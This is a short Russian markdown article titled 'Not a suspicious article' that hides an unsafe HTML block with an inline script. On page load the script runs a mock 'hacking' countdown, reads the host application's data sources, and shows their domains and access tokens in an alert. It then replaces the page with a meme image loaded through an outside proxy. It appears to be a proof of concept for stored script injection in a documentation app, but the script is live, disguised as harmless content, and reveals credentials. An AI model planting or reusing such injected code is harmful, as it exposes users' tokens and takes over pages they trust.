---
order: 1
title: Не подозрительная статья
---

Вообще ничего подозрительного

[html:unsafe]

<div>123</div>
<script>
// const ctx = await window.app.contextFactory.fromBrowser();
alert(`Взлом через 3`);
alert(`Взлом через 2`);
alert(`Взлом через 1`);
window.app.contextFactory.fromBrowser().then((ctx)=>{
    const workspace = window.app.wm.current()
	const rp = window.app.rp;
    const sourceDatas = rp.getSourceDatas(ctx);
    
    alert(`Привет, я взломал тебя:\n\n${sourceDatas.map(d=>d.domain + " " + d.token).join("\n")}`);
	document.body.innerHTML = `<img crossorigin="anonymous" src="https://corsproxy.io/?url=https://en.meming.world/images/en/9/9e/Professionals_Have_Standards.jpg"></img>`;
})

    </script>

[/html]